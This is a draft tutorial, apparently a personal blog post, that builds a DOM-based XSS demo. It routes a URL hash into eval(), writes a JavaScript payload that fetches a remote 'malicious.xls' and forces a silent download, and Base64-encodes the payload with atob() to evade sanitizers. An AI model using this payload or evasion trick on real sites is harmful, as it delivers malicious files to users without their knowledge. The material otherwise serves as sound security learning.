[DRAFT]

# Introduction
I was curious how someone could share a legitate link, say with a nytimes.com URL, and have someone download a malicious file without it registering on server's request logs. I was particualy interested in this because I run a product that precompiles all of a site's assets (html, css, javascipt, etc) and publishes it to a S3 bucket. Given that there is no "server" to control, how could someone accomplish this?

The simple answer is by exploiting a XSS (Cross-Site Scriping) issue. I've never implemented an XSS script, so to get started, I decided to built a naive implementation of how could work. First, I needed to create a dummy site to takes URL parameter and somehow make it's way into an `eval` call within the app. This might seem unlikley, but it can happen, but I'll go into more detail later on how this could happen later. But for now, lets just imagine the app does something like this:

```
var url_hash = window.location.hash.substr(1);

//do stuff 
route_page(url_hash)

function route_page(url_hash){
 // do more stuff
 eval(path)
}
``` 

With the current code, if you pass `example.com/#alert('hello')` in the URL you'll get an alert box.

## The payload
So if find a situation like this, then I do whatever we want. But, my goal was specfically to get a user to download a file. So I decided go focus on the payload that would accomplish this. So I created this:


```
fetch('http://localhost:3000/malicious.xls')
  .then(response => response.blob())
    .then(function(data) {
      const obj = window.URL.createObjectURL(new Blob([data], {type: 'application/vnd.ms-excel'}))
      const el = document.createElement('a');
      el.href = obj;
      el.setAttribute('download', "compromised.xls")
      document.body.appendChild(el)
      el.click()
    }
  );
```


This code uses a few interesting methods. (window.URL.createObjectURL)[https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL] "creates DOMString containing a URL representing the object given in the parameter." What this means is that we can pass data to the `createObjectURL` and it will a URL for that object. That's quite handy. You'll  notice that we pass it a `[new Blob](https://developer.mozilla.org/en-US/docs/Web/API/Blob/Blob)`. This joins together an array of data and packages in a file structure. In this case, we want the data to have the MIME-type of an Excel file.

So this code makes a request to a server, downloads the data into memory, stores into a blob that is claiming to be an Excel file and creates a URL for this data. 

It then creates an `<a>` link  in the DOM, and points the `href`` element to our newly created URL and click the link. This all happens in a split second, so from the user's perspective, nothing strange happened.

## Avoid the santizers
How will the user get and execute this code? The URL is a start, but I can't pass code directly in the URL and expect it to run. Most applications are wise enough to filter out special characters. So we need to send code to the app, but somehow it not look like code. 

This is where Base64 comes in. According to (Mozilla's documentation)[https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/Base64_encoding_and_decoding
]:

> Base64 encoding schemes are commonly used when there is a need to encode binary data that needs to be stored and transferred over media that are designed to deal with textual data. This is to ensure that the data remain intact without modification during transport. Base64 is commonly used in a number of applications including email via MIME, and storing complex data in XML.

In Javascript, we have `atob()` and `btoa()` to handle the encoding and decoding of strings.


- btoa() encodes a String to a Base-64 encoded ASCII string
- atob() decodes Base-64 encoded ASCII string into a String

When I pass the Javascript from above to btoa, I got the following string:

> ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vbWFsaWNpb3VzLnhzbCcpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuYmxvYigpKQogICAgLnRoZW4oZnVuY3Rpb24oZGF0YSkgewogICAgICBjb25zdCBvYmogPSB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbZGF0YV0sIHt0eXBlOiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJ30pKQogICAgICBjb25zdCBlbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsKICAgICAgZWwuaHJlZiA9IG9iajsKICAgICAgZWwuc2V0QXR0cmlidXRlKCdkb3dubG9hZCcsICJjb21wcm9taXNlZC54bHMiKQogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGVsKQogICAgICBlbC5jbGljaygpCiAgICB9CiApCgoK


If I pass this String to our example URL parser above, nothing will happen. The Javascript parser will receive the text but not know what to do with it. So I need to wrap the string in a atob() call. Once I do that, `example.com/#atob(ZmV0Y2goJ2h0dHB....)` the code will execute.

## It's not that simple 
Although I was able to execute arbitrary Javascript in a browser, there are still a few things we need to get around. Lets review.

TODO
- Handling CORS
- Known CVEs
- Execution path of an Javascript app
- Client-side logging
 
 
 
 
 ----
Sources:
https://medium.com/bugbountywriteup/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa
